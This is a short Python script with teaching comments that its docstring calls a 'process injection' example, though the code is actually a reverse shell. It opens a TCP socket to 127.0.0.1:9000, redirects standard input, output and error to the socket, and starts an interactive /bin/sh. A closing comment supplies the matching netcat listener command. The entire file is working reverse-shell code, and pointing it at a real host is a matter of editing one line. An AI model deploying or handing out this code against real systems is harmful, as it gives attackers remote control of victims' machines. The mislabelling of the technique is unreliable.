"""
Example of process injection technique.

This program will open a socket to an IP/server on a port.
The attacker might be listening on the given ip and port.
Once a reverse shell opens up, attacker easily takes control of the target system.
"""
import socket
import subprocess
import os

# Below lines of code creates a new TCP socket (SOCK_STREAM) using IPv4 addresses (AF_INET)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9000))
# Input, output and stderr go to the socket connection instead of terminal i.e. attacker can control these.
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
# start an interactive shell session
subprocess.call(["/bin/sh", "-i"])

# Attacker may execute the command to connect to the socket (to check: run on your other terminal)
# nc -l 127.0.0.1 9000